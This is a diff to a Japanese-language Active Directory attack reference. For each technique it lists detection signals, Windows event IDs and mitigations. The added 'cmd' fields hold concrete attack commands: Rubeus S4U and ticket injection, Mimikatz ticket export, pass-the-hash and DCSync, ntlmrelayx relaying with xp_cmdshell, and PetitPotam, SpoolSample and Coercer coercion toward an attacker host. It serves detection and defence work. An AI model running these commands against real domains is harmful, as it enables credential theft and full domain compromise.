+        "q": "Rubeus.exe s4u /user:host01$ /rc4:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /impersonateuser:administrator /msdsspn:\"cifs/host01.corp.local\" /ptt"
+      }
+    ],
     "detect": "一般ユーザーによる新規コンピュータ作成、自ホストへのRBCD設定、S4U連鎖、直後のサービス作成/SYSTEム実行。",
     "events": "4741(コンピュータ作成), 5136(RBCD), 4769(S4U), 7045(サービス)",
     "mitigate": "ms-DS-MachineAccountQuota=0、LDAP署名+EPA必須化、LDAPS強制。エンドポイントでのRBCD属性変更監視、管理者権限最小化。",
@@ -2252,6 +3732,28 @@ AD.I18N.ja.attacks = [
     "summary": "奪取したNTLM認証をSQL Serverへ中継し、xp_cmdshell等でコマンド実行やデータ奪取を行うリレー先の一種。",
     "how": "Responder/Coercionで得た認証をntlmrelayx -t mssql://<sqlsrv>へ中継し、-q でクエリ実行やxp_cmdshell有効化。中継アカウントがsysadmin/DB権限を持つ場合に有効。前提: SQLがWindows認証を受け、署名で保護されていないこと。",
     "tools": "ntlmrelayx.py -t mssql://<host> -q 'exec xp_cmdshell ...'",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "中継したWindows認証でMSSQLに`xp_cmdshell`を直接実行。`-q`のSQL文自体が実行内容の一次証拠",
+        "q": "ntlmrelayx.py -t mssql://10.0.0.20 -q \"exec master..xp_cmdshell 'whoami'\""
+      },
+      {
+        "tool": "Impacket",
+        "t": "対話的SQLシェルをローカルTCPで待受ける方式。プロセスに単発コマンドが残らず後続接続との相関が必要",
+        "q": "ntlmrelayx.py -t mssql://10.0.0.20 -i"
+      },
+      {
+        "tool": "Responder",
+        "t": "認証を捕捉する送り手側。LLMNR/NBT-NS応答直後にMSSQLサーバへの中継接続が続く",
+        "q": "responder -I eth0 -wrf"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "DB接続権限を持つホストを強制認証させ中継元へ誘導する前段のコアーシオン",
+        "q": "python3 PetitPotam.py sqladmin-pc.corp.local '\\\\attacker-pc\\share\\x'"
+      }
+    ],
     "detect": "SQLへの想定外ソースからのWindows認証ログオン、xp_cmdshell有効化、異常なsp実行。",
     "events": "SQL監査ログ(18453/18454=ログイン成功), 4624, 18456(ログイン失敗)",
     "mitigate": "SQLでForce Encryption/チャネル暗号化と拡張保護(EPA)を有効化、xp_cmdshell無効、最小権限。名前解決ポイズニング対策。",
@@ -2292,6 +3794,33 @@ AD.I18N.ja.attacks = [
     "summary": "制約なし委任を持つホストを攻撃者が支配し、PrinterBug等でDC$を強制認証させることでDCのTGTをメモリに捕捉、DCSyncへ至る。",
     "how": "制約なし委任サーバ(または攻撃者が作った委任コンピュータ)を掌握しRubeus monitorでTGTを待受、PrinterBug/PetitPotamでDC$をそのホストへKerberos認証させるとDCのTGTが委任でキャッシュされ抽出可能。抽出TGTでDCSync→ドメイン完全掌握。前提: 支配下に制約なし委任ホスト、Coercion可能なDC。",
     "tools": "Rubeus monitor/dump, SpoolSample/PetitPotam, mimikatz, secretsdump",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "制約なし委任ホストでDC$のTGTキャッシュを監視。`/filteruser:DC01$`がDC限定の待受を示す",
+        "q": "Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap"
+      },
+      {
+        "tool": "SpoolSample",
+        "t": "PrinterBugでDC自身に委任ホストへのKerberos認証を強制。引数はホスト名のみで`\\\\`は自動付与される",
+        "q": "SpoolSample.exe DC01 attacker-pc"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "EFSRPCでの代替コアーシオン。認証情報なしで実行できるパッチ前提のワンライナー",
+        "q": "python3 PetitPotam.py dc01.corp.local '\\\\attacker-pc\\share\\x'"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "捕捉したDCのTGTをセッションへ注入。`kerberos::ptt`直後にDC名義のKerberos操作が続く",
+        "q": "mimikatz # kerberos::ptt dc01_tgt.kirbi"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "注入済みDC権限のKerberosコンテキストをそのままDCSyncに利用。DC以外の端末から実行される`lsadump::dcsync`が異常",
+        "q": "mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt"
+      }
+    ],
     "detect": "制約なし委任ホストへのDC$認証、委任フラグ付きTGTの異常な流入、直後のDCSync。",
     "events": "4768/4769(TGT/TGS), 4662(DCSync), 4624(DC$)",
     "mitigate": "制約なし委任を全廃し制約付き/RBCDへ移行、DC等の重要アカウントを『機密で委任不可』(Protected Users/AccountNotDelegated)に設定。Spooler停止、Coercion対策。",
@@ -2332,6 +3861,33 @@ AD.I18N.ja.attacks = [
     "summary": "非制約委任が設定されたホストにログオン/認証させたユーザーのTGTがメモリにキャッシュされるのを窃取し、そのユーザーになりすます攻撃。",
     "how": "前提: TRUSTED_FOR_DELEGATION フラグ(userAccountControl)が設定されたコンピュータ/サービスアカウントに対するローカル管理者権限、または当該アカウントの制御。手順: (1) PowerViewやActive Directoryモジュールで非制約委任ホストを列挙(Get-DomainComputer -Unconstrained)。(2) 対象ホストへ高権限ユーザーを認証させる(共有アクセス、印刷、Coerce)。(3) Rubeus monitor / triage / dump でキャッシュされたTGTを抽出、またはmimikatz sekurlsa::tickets /export。(4) 抽出したTGTをPTT(Pass-the-Ticket)で再利用しDCSync等へ。DCのマシンアカウントTGTを狙う場合はPrinterBug(MS-RPRN SpoolSample)やPetitPotam(MS-EFSRPC)でDC$を強制認証させる。",
     "tools": "Rubeus (monitor/dump/asktgt), mimikatz (sekurlsa::tickets), PowerView (Get-DomainComputer -Unconstrained), SpoolSample/printerbug.py, PetitPotam/Coercer, impacket (secretsdump)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "非制約委任(TRUSTED_FOR_DELEGATION)を持つコンピュータを列挙する偵察コマンド。単体では正規棚卸しと区別できない低感度シグナル",
+        "q": "Get-DomainComputer -Unconstrained -Properties dnshostname,distinguishedname"
+      },
+      {
+        "tool": "SpoolSample",
+        "t": "PrinterBug(MS-RPRN)でDC$を対象ホストへ強制認証させTGTキャッシュを誘発。攻撃元での起動と445への接続が相関ポイント",
+        "q": "SpoolSample.exe dc01.corp.local attacker01.corp.local"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "4624ログオンを監視し新規TGTをLUID単位で自動抽出し続ける。`monitor`と`/interval`が常駐プロセスのコマンドラインに残る",
+        "q": "Rubeus.exe monitor /targetuser:DC01$ /interval:5 /nowrap"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "LSASSにキャッシュされたTGTを.kirbiへエクスポート。直前の`privilege::debug`とセットでの実行が決定的",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::tickets /export\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "窃取したTGTを現在のログオンセッションへ注入しなりすましを完了させる。`ptt`単体は正規利用もあり直前のdump/monitorと相関させる",
+        "q": "Rubeus.exe ptt /ticket:doIFvjCCBYqgAw...=="
+      }
+    ],
     "detect": "非制約委任が設定された非DCアカウントを定期棚卸し(userAccountControl & 0x80000)。DCへの異常なSMB/RPC強制認証(EFSRPC, MS-RPRN)や、通常TGT委任が発生しないホストで大量のTGTが観測される挙動を監視。イベント4768/4769の急増や、委任ホストからDCへの非典型的な認証を相関分析。",
     "events": "4768 (TGT要求), 4769 (サービスチケット要求), 4624 (ログオン), 5145 (共有アクセス/spoolss,efsrpc pipe)",
     "mitigate": "重要アカウント(管理者)を「Protected Users」グループに追加し委任対象外にする。アカウント属性で「アカウントは委任できない(NOT_DELEGATED / Account is sensitive and cannot be delegated)」を設定。非制約委任は原則廃止しRBCDへ移行。DCのPrinterBug対策としてSpoolerサービス停止、PetitPotam対策(EFSパッチ/認証拡張保護)。",
@@ -2372,6 +3928,33 @@ AD.I18N.ja.attacks = [
     "summary": "制約委任(msDS-AllowedToDelegateTo)を持つアカウントを制御下に置き、S4U2Self+S4U2Proxyで任意ユーザーになりすまして許可されたサービスへアクセスする攻撃。",
     "how": "前提: msDS-AllowedToDelegateTo が設定されたサービスアカウント/コンピュータのクレデンシャル(パスワード/NT/AESキー)またはTGT。手順: (1) 委任アカウントを列挙(Get-DomainUser/Computer -TrustedToAuth)。(2) そのアカウントのTGTを取得。(3) S4U2Self で自身宛に任意ユーザー(例: Administrator)のサービスチケットを取得、(4) S4U2Proxy で msDS-AllowedToDelegateTo に列挙されたSPN向けチケットを取得。protocol transition(TRUSTED_TO_AUTH_FOR_DELEGATION)が有効なら初期認証なしで任意ユーザーを偽装可能。SPNのsname部を書き換え(alternate service name / sname trick)、同一ホストの別サービス(例: cifsをldapやhostへ)に横展開してDCSyncやリモート実行へ拡大。",
     "tools": "Rubeus s4u (/impersonateuser /msdsspn /altservice), impacket getST.py (-spn -impersonate), kekeo tgs::s4u, mimikatz",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "msDS-AllowedToDelegateToが設定済みのアカウントを列挙。protocol transition対象の棚卸しで単体は正規運用と重なる",
+        "q": "Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "SSPIの偽装委任トリックで現在セッションから資格情報なしにTGTを取得。`tgtdeleg`という非定型な文字列自体が高感度",
+        "q": "Rubeus.exe tgtdeleg /nowrap"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "S4U2Self+S4U2Proxyで任意ユーザーを偽装しサービスチケットを取得・注入。`/impersonateuser`と`/msdsspn`の組合せが決定的",
+        "q": "Rubeus.exe s4u /user:svc_web /rc4:aabbccddeeff00112233445566778899 /impersonateuser:administrator /msdsspn:\"cifs/fileserver01.corp.local\" /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からS4U2Self/Proxyを実行しSTを取得。DCにプロセスログはなく4769が短時間に2件連続発行される点が手掛かり",
+        "q": "getST.py -spn cifs/fileserver01.corp.local -impersonate administrator corp.local/svc_web:'Passw0rd!'"
+      },
+      {
+        "tool": "kekeo",
+        "t": "旧世代ツールkekeoによるS4U実装。稀な実行だが`tgs::s4u`という文字列がシグネチャに残る",
+        "q": "kekeo.exe \"tgs::s4u /tgt:svc_web.kirbi /user:Administrator@corp.local /service:cifs/fileserver01.corp.local\" exit"
+      }
+    ],
     "detect": "S4U2Proxyの痕跡としてTransited Services属性が入った4769イベントを監視。protocol transition未設定なのにS4Uが多発する、または委任先SPNと異なるsnameへのアクセスを相関。委任アカウントの異常なサービスチケット要求パターンを検知。msDS-AllowedToDelegateToの変更(監査)を追跡。",
     "events": "4769 (Transited Services フィールドあり), 4624, 4738 (ユーザー/サービスアカウント属性変更), 4742 (コンピュータアカウント属性変更)",
     "mitigate": "protocol transition(TRUSTED_TO_AUTH_FOR_DELEGATION)を極力無効化しconstrained delegation with protocol transitionを避ける。委任サービスアカウントのパスワードを長く/gMSA化。特権アカウントをProtected Users登録・「委任できない」設定。委任先SPNを最小化。altserviceトリック対策として委任は本当に必要なサービスのみに限定。",
@@ -2407,6 +3990,38 @@ AD.I18N.ja.attacks = [
     "summary": "対象コンピュータの msDS-AllowedToActOnBehalfOfOtherIdentity 属性へ攻撃者制御アカウントを書き込み、S4Uで対象ホスト上の任意ユーザー(管理者)になりすます攻撃。",
     "how": "前提: 対象コンピュータオブジェクトへのGenericWrite/GenericAll/WriteProperty/WriteDACL等の書き込み権限、およびSPNを持つ制御アカウント(既存コンピュータアカウント、または MachineAccountQuota>0 を利用して自作したコンピュータアカウント)。手順: (1) addcomputer.py / PowerMad(New-MachineAccount)で新規マシンアカウントを作成(既定 MAQ=10)。(2) rbcd.py または PowerView Set-ADComputer -PrincipalsAllowedToDelegateToAccount で対象の msDS-AllowedToActOnBehalfOfOtherIdentity に自作アカウントSIDを設定。(3) Rubeus s4u / getST.py で作成アカウントのTGTから S4U2Self+S4U2Proxy を実行し、対象ホストのcifs/host/ldap宛に管理者偽装チケットを取得。(4) PsExec/DCSyncで侵害。ACLをコエルス(NTLMリレーでLDAPへ書き込み)して属性設定するパターン(PetitPotam+ntlmrelayx --delegate-access)も主流。",
     "tools": "impacket (addcomputer.py, rbcd.py, getST.py, ntlmrelayx --delegate-access), PowerMad, PowerView (Set-ADComputer/Get-DomainComputer), Rubeus s4u, StandIn",
+    "cmd": [
+      {
+        "tool": "Powermad",
+        "t": "MachineAccountQuota(既定10)を利用し自作コンピュータアカウントを作成。4741が非管理端末IPから発火する点が異常",
+        "q": "New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側からSAMR/LDAP経由でマシンアカウントを作成。4741とその後の書込操作をセットで見る",
+        "q": "addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd1!'"
+      },
+      {
+        "tool": "Impacket",
+        "t": "対象のmsDS-AllowedToActOnBehalfOfOtherIdentityへ自作アカウントSIDを書込む本丸操作。5136(属性変更)が唯一のサーバ側痕跡",
+        "q": "rbcd.py -delegate-to 'FILESRV01$' -delegate-from 'FAKE01$' -action write -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd1!'"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "作成したFAKE01$の資格情報でS4U2Self+Proxyを実行し対象ホストの管理者チケットを取得",
+        "q": "Rubeus.exe s4u /user:FAKE01$ /rc4:aabbccddeeff00112233445566778899 /impersonateuser:administrator /msdsspn:cifs/filesrv01.corp.local /ptt"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "RSAT ADモジュールの高水準ラッパーで同属性を直接設定。関数名`Set-ADComputer`が4104に残る場合がある",
+        "q": "Set-ADComputer -Identity FILESRV01 -PrincipalsAllowedToDelegateToAccount FAKE01$"
+      },
+      {
+        "tool": "Impacket",
+        "t": "coercionで得たNTLM認証をLDAPSへリレーしRBCD属性を自動設定。リレー元IPからの異常なLDAPバインドが痕跡",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support"
+      }
+    ],
     "detect": "msDS-AllowedToActOnBehalfOfOtherIdentity 属性の変更(4662/ディレクトリ変更監査)を監視。MachineAccountQuotaによる新規コンピュータアカウント作成(4741)を追跡し、既存でない不審なマシンアカウントからのS4Uチケット要求(4769 Transited Services)を相関。短時間でのアカウント作成→属性書込→S4Uの一連シーケンスを検知。",
     "events": "4741 (コンピュータアカウント作成), 4742 (コンピュータアカウント変更), 4662 (オブジェクト属性変更), 4769 (Transited Services)",
     "mitigate": "ms-DS-MachineAccountQuota を 0 に設定し一般ユーザーによるマシンアカウント作成を禁止。コンピュータオブジェクトのDACLを見直し不要な書込権限を除去。特権アカウントをProtected Users/「委任できない」に設定。NTLMリレー対策(SMB署名、LDAP署名/チャネルバインディング、EPA)。msDS-AllowedToActOnBehalfOfOtherIdentityへの書込を監査アラート化。",
@@ -2447,6 +4062,33 @@ AD.I18N.ja.attacks = [
     "summary": "対象アカウントの msDS-KeyCredentialLink 属性に攻撃者の公開鍵(証明書)を追加し、PKINIT(証明書ベースKerberos)でそのアカウントとして認証してTGT/NTLMハッシュを取得する攻撃。",
     "how": "前提: 対象ユーザー/コンピュータオブジェクトへの msDS-KeyCredentialLink 書込権限(GenericWrite/GenericAll/WriteProperty)。環境にPKINITをサポートするKDC(DC上に証明書、Windows Server 2016+ / Key Trust)が必要。手順: (1) Whisker add または pyWhisker で対象の msDS-KeyCredentialLink にKeyCredential(自作鍵ペア)を追加。(2) Rubeus asktgt /certificate または gettgtpkinit.py でPKINIT認証しTGTを取得。(3) getnthash / Rubeus /getcredentials(U2U)で対象のNTハッシュを復元しPTHやDCSyncへ拡大。ACLコエルス経由(RBCD/ESC同様)で書込権限を得て実行するチェーンも一般的。低権限からの権限昇格・永続化手段として利用。",
     "tools": "Whisker (add/list/clear), pyWhisker, Rubeus (asktgt /certificate /getcredentials), Certipy shadow auto, gettgtpkinit.py (PKINITtools), ntpwdextract",
+    "cmd": [
+      {
+        "tool": "Whisker",
+        "t": "msDS-KeyCredentialLinkへ自作証明書の公開鍵を追加。5136属性変更と`Whisker.exe add`実行が痕跡",
+        "q": "Whisker.exe add /target:\"WKSTA01$\" /domain:corp.local /dc:dc01.corp.local /path:cert.pfx /password:'Passw0rd!'"
+      },
+      {
+        "tool": "pywhisker",
+        "t": "Linux側での同等操作。端末プロセスログはなくDC側5136とLDAP書込元IPで追う",
+        "q": "python3 pywhisker.py -d corp.local -u svc_user -p 'Passw0rd!' --target WKSTA01$ --action add -D ./certs/ -P certpass"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "追加した証明書でPKINIT認証しTGTを取得。`/certificate`と`/getcredentials`の組合せがPKINIT起点の決定打",
+        "q": "Rubeus.exe asktgt /user:WKSTA01$ /certificate:cert.pfx /password:'Passw0rd!' /domain:corp.local /dc:dc01.corp.local /getcredentials /nowrap"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "Linux側でPKINIT TGTを取得しccache化。4768が事前認証タイプ16(PA-PK-AS-REQ)となり通常のパスワード認証と区別できる",
+        "q": "gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'Passw0rd!' corp.local/wksta01$ wksta01.ccache"
+      },
+      {
+        "tool": "Certipy",
+        "t": "追加・PKINIT認証・削除まで一括自動化する高速チェーン。短時間に連続する5136の追加/削除が特徴",
+        "q": "certipy shadow auto -u svc_user@corp.local -p 'Passw0rd!' -account WKSTA01$ -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "msDS-KeyCredentialLink 属性の変更(4662/ディレクトリサービス変更5136)を監視 — 通常はWindows Hello for Business/デバイス登録以外で変わらない。PKINITによる認証(4768で証明書情報フィールドあり、pre-auth type 16/PA-PK-AS-REQ)を追跡。属性書込→即PKINIT-TGT要求のシーケンスを相関。既存の正規KeyCredentialとの差分をベースライン化。",
     "events": "5136 (ディレクトリオブジェクト変更), 4662 (属性アクセス), 4768 (証明書/PKINITによるTGT), 4769",
     "mitigate": "オブジェクトのDACLを最小化しmsDS-KeyCredentialLinkへの不要な書込権限を除去。特権アカウントをProtected Users登録。Windows Hello for Businessを使わない環境ではKey Trust/PKINITを無効化検討。属性変更を監査ルール化しSOCアラート。ADCS/PKI経路のハードニング(ESC対策)も併せて実施。定期的にKeyCredentialLinkの棚卸し。",
@@ -2487,6 +4129,38 @@ AD.I18N.ja.attacks = [
     "summary": "強制認証(coercion)でマシンアカウントのNTLM認証を引き出しLDAP(S)へリレーして、RBCD属性やShadow Credentialsを書き込み委任経路を確立する複合攻撃。",
     "how": "前提: リレー先LDAPの署名/チャネルバインディングが未強制、被害コンピュータでLDAP書込に足るコンテキスト、coercion可能なRPCインターフェース。手順: (1) ntlmrelayx.py -t ldaps://DC --delegate-access で待受。(2) PetitPotam(MS-EFSRPC)/PrinterBug(MS-RPRN)/DFSCoerce(MS-DFSNM)/Coercerで対象マシンアカウントをリレー先へ強制認証。(3) リレーされた認証でntlmrelayxが新規マシンアカウント作成+対象のmsDS-AllowedToActOnBehalfOfOtherIdentityを設定(RBCD)、または --shadow-credentials でmsDS-KeyCredentialLinkを設定。(4) getST.py/Rubeusで偽装チケット取得しホスト侵害。DC自身をリレーしてDC侵害に至るケースあり。",
     "tools": "impacket ntlmrelayx.py (--delegate-access/--shadow-credentials), PetitPotam, printerbug.py, dfscoerce.py, Coercer, addcomputer.py",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "LDAPS宛のリレー待受でRBCD属性を自動設定。署名/CBT未強制のLDAPへ異常な接続元からバインドが入る",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support"
+      },
+      {
+        "tool": "Impacket",
+        "t": "msDS-KeyCredentialLinkをリレー経由で書込むPKINIT系変種。`--shadow-target`で書込先を個別指定できる",
+        "q": "ntlmrelayx.py -t ldaps://dc01.corp.local --shadow-credentials --shadow-target FILESRV01$"
+      },
+      {
+        "tool": "PetitPotam",
+        "t": "MS-EFSRPCで対象マシンアカウントをリレー先へ強制認証させる。lsarpc/efsrパイプへの異常アクセスが手掛かり",
+        "q": "PetitPotam.py -pipe efsr attacker01.corp.local filesrv01.corp.local"
+      },
+      {
+        "tool": "DFSCoerce",
+        "t": "MS-DFSNMのNetrDfsRemoveStdRoot/AddStdRootを悪用した強制認証。DFS名前空間サービスへの異常RPC呼出として残る",
+        "q": "dfscoerce.py -d corp.local -u svc_user -p 'Passw0rd!' attacker01.corp.local filesrv01.corp.local"
+      },
+      {
+        "tool": "printerbug.py",
+        "t": "MS-RPRNのRpcRemoteFindFirstPrinterChangeNotificationExで強制認証。spoolsv.exeの異常な発信接続が手掛かり",
+        "q": "printerbug.py corp.local/svc_user:'Passw0rd!'@filesrv01.corp.local attacker01.corp.local"
+      },
+      {
+        "tool": "Coercer",
+        "t": "12種のcoercion手法を統合した後継ツール。`--filter-protocol-name`の指定で使用RPCが特定できログ相関に使える",
+        "q": "coercer coerce -u svc_user -p 'Passw0rd!' -d corp.local --filter-protocol-name MS-DFSNM -l attacker01.corp.local -t filesrv01.corp.local"
+      }
+    ],
     "detect": "coercion RPC呼出(EFSRPC, MS-RPRN spoolss, MS-DFSNM)を名前付きパイプアクセス5145で監視。マシンアカウントが自身以外のオブジェクト属性(RBCD/KeyCredentialLink)を変更する異常なLDAP書込(4662/5136)を検知。NTLM認証がLDAP(S)に到達する経路や、認証元と操作元IPの不一致を相関。",
     "events": "5145 (efsrpc/spoolss/netdfs pipe), 4662, 5136, 4741, 4624 (NTLM Type3)",
     "mitigate": "LDAP署名必須化 + LDAPSチャネルバインディング(EPA)を強制。SMB署名必須。EFSRPC/Spooler/DFSNMの不要インターフェース無効化とパッチ適用。MachineAccountQuota=0。Extended Protection for Authentication有効化。RBCD/KeyCredentialLink属性変更の監査アラート。DC間・DCへの不要なRPC coercion経路をファイアウォールで制限。",
@@ -2527,6 +4201,28 @@ AD.I18N.ja.attacks = [
     "summary": "S4U委任で取得したサービスチケットのサービスクラス(sname)部分を書き換え、委任が許可されていない別サービス(例: HOST→LDAP/CIFS)へ横展開する亜種。",
     "how": "前提: constrained delegation または RBCD が確立済みで、いずれかのSPN向けにS4U2Proxyチケットを取得できること。手順: KerberosのサービスチケットはKDCがsnameで暗号化検証するが、同一ホスト(同一アカウント)であればサービスクラス部はサービス側で厳密検証されない実装挙動を悪用。(1) 委任許可されたSPN(例: TIME/host や HTTP/host)向けにS4U2Proxyチケットを取得。(2) Rubeus /altservice:cifs,host,ldap,http でチケットのsnameを書き換え。(3) 書き換えたチケットでCIFS(ファイル/PsExec)やLDAP(DCSync)へアクセス。これにより一見無害なSPNへの委任からフル侵害へ昇格。",
     "tools": "Rubeus s4u /altservice, impacket getST.py -altservice, kekeo",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "S4U2Proxyで取得したチケットのsname部を書換え。`/altservice:cifs,host,ldap`のカンマ区切り列挙が特徴的な文字列",
+        "q": "Rubeus.exe s4u /user:svc_web /rc4:aabbccddeeff00112233445566778899 /impersonateuser:administrator /msdsspn:\"time/dc01.corp.local\" /altservice:cifs,host,ldap /ptt"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側で同等のsname書換えを実施。DCには最初に許可されたSPN向けの4769のみが残り改ざん自体は検知できない",
+        "q": "getST.py -spn time/dc01.corp.local -altservice ldap/dc01.corp.local -impersonate administrator corp.local/svc_web:'Passw0rd!'"
+      },
+      {
+        "tool": "kekeo",
+        "t": "kekeoでも同様のsname置換が可能。稀な実行だが`tgs::s4u`と複数`/service`指定が検知辞書に残る",
+        "q": "kekeo.exe \"tgs::s4u /tgt:svc_web.kirbi /user:Administrator@corp.local /service:time/dc01.corp.local|ldap/dc01.corp.local\" exit"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "書換え後のチケットを現在セッションへ注入する仕上げ。`ptt`単体は正規利用もあり直前の`s4u /altservice`実行と相関させる",
+        "q": "Rubeus.exe ptt /ticket:doIFvjCCBYqgAw...=="
+      }
+    ],
     "detect": "snameの差し替えはRubeusがKRB-CRED(.kirbi)上でオフライン実行し、整合性保護されるのはサーバ(ホスト)名のみでサービスクラス部は保護されない。したがってKDCへはベースSPNのS4U2Proxy要求が1件出るだけで、cifs/ldap等の代替クラスは独立した4769として現れない——KDC側で「サービスクラスの種類数」を数える検知は本手法を取りこぼす。実効的な検知は、(1)委任可能アカウントによる低価値SPN(host/time/http等)へのS4U2Proxy要求(4769。Transited/Transmitted Services欄が非空=constrained delegation)を、(2)同一標的ホストで対応するTGSの無い特権アクセス——LDAP/DCSync(4662 レプリケーション権限GUID 1131f6aa/1131f6ad)や管理共有CIFS(5140/5145)——と相関し、(3)発信元端末のRubeus/kekeo /altservice 実行(Sysmon EID1/EDR)で裏取りする。",
     "events": "4769, 4662 (DCSync時のReplication権限アクセス), 4624",
     "mitigate": "constrained delegationの委任先SPNを本当に必要なものだけに限定(特にldap/host/cifsを不用意に含めない)。protocol transitionを避ける。特権アカウントをProtected Users/委任禁止に。可能ならRBCDや委任自体を廃止。DCSync検知(異常なレプリケーション)を併設。",
@@ -2562,6 +4258,33 @@ AD.I18N.ja.attacks = [
     "summary": "Shadow CredentialsやPKINITで得たTGTからUser-to-User(U2U)+PAC復号でアカウントのNTLMハッシュを平文パスワードなしに抽出する亜種。",
     "how": "前提: 対象アカウントのPKINIT認証成功(Shadow Credentials等でTGT取得済み)。手順: (1) Rubeus asktgt /certificate /getcredentials または gettgtpkinit.py + getnthash.py を使用。(2) PKINIT時にKDCがPAC_CREDENTIAL_INFO(NTLMハッシュを含む)を暗号化して返す仕組み(UnPAC-the-hash)を利用し、TGTセッションキーで復号してNTハッシュを取得。(3) 得たハッシュでPass-the-Hash/Overpass-the-Hash、DCSync、永続化。マシンアカウントに対して行えばそのホストの完全制御に直結。",
     "tools": "Rubeus (asktgt /getcredentials), PKINITtools (gettgtpkinit.py, getnthash.py), Certipy (auth), Whisker連携",
+    "cmd": [
+      {
+        "tool": "Rubeus",
+        "t": "PKINIT TGT取得と同時にU2U+PAC復号でNTLMハッシュを抽出。`/getcredentials`という単一フラグが決定的シグナル",
+        "q": "Rubeus.exe asktgt /user:WKSTA01$ /certificate:cert.pfx /password:'Passw0rd!' /domain:corp.local /dc:dc01.corp.local /getcredentials /show"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "Linux側の2段階実装の前段。PKINITの4768が事前認証タイプ16として記録される",
+        "q": "gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'Passw0rd!' corp.local/wksta01$ wksta01.ccache"
+      },
+      {
+        "tool": "PKINITtools",
+        "t": "取得したTGTセッションキーでNTハッシュを復元する後段コマンド。U2U相当のTGS要求(4769、sname=自分自身)が直後に残る",
+        "q": "export KRB5CCNAME=wksta01.ccache && getnthash.py -key aabbccddeeff00112233445566778899 corp.local/wksta01$"
+      },
+      {
+        "tool": "Certipy",
+        "t": "証明書によるPKINIT認証とNTハッシュ復元を内包する`auth`コマンド。UnPAC-the-hash実装がauto連鎖の一部として頻出",
+        "q": "certipy auth -pfx wksta01.pfx -domain corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "復元したNTハッシュでPass-the-Hashし後続の横展開を行う。`/ntlm:`が復元済みハッシュそのものであることが多い",
+        "q": "mimikatz.exe \"sekurlsa::pth /user:wksta01$ /domain:corp.local /ntlm:aabbccddeeff00112233445566778899 /run:cmd.exe\" exit"
+      }
+    ],
     "detect": "PKINITによるTGT要求(4768, PA-PK-AS-REQ, 証明書情報あり)を、通常証明書認証を使わないアカウントで観測した場合にアラート。Shadow Credentials設定(5136 KeyCredentialLink)とPKINIT認証の連続シーケンスを相関。直後のNTLM(PTH)利用も追跡。",
     "events": "4768 (証明書/PKINIT), 5136, 4769, 4624 (NTLM Type3)",
     "mitigate": "Shadow Credentials対策(msDS-KeyCredentialLink DACL最小化・監査)を基盤に、PKINIT/Key Trust不要環境では無効化。Protected Usersで特権アカウントの委任・PKINIT悪用を制限。NTLM全体の抑制・監査。KeyCredentialLink棚卸しの定期実施。",
@@ -2602,6 +4325,33 @@ AD.I18N.ja.attacks = [
     "summary": "対象オブジェクトへの完全な制御権。ユーザー/グループ/コンピュータ/OU全てで最強の踏み台エッジ。",
     "how": "GenericAllを持つオブジェクトに応じて任意の後続攻撃へ分岐する。ユーザーならForceChangePassword/Shadow Credentials/Targeted Kerberoast、コンピュータならRBCD/Shadow Credentials、グループならAddMember、ドメインオブジェクトならWriteDaclでDCSync権限付与が可能。BloodHoundでGenericAllエッジとして表示され、`Get-ObjectAcl`/`dacledit.py`で確認・悪用する。",
     "tools": "PowerView (Add-DomainGroupMember, Set-DomainUserPassword), BloodHound, impacket (dacledit.py, ntlmrelayx), Rubeus, Whisker/pyWhisker",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "GenericAllを持つユーザーへ現パスワード不要で強制リセット。`Set-DomainUserPassword`は4104のスクリプトブロックに残る",
+        "q": "Set-DomainUserPassword -Identity victim_user -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "PowerView",
+        "t": "GenericAllを持つ特権グループへ直接メンバー追加。`Add-DomainGroupMember`実行後は4728/4756との相関が必須",
+        "q": "Add-DomainGroupMember -Identity 'Domain Admins' -Members svc_user"
+      },
+      {
+        "tool": "Whisker",
+        "t": "GenericAllからShadow Credentials追加へ直行。`/target:`とmsDS-KeyCredentialLink書換の4662が痕跡",
+        "q": "Whisker.exe add /target:victim_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "GenericAllで自分に明示的なFullControl ACEを追記し永続化。Linux発でDCにプロセスログは残らず4662とLDAP書込のみが手掛かり",
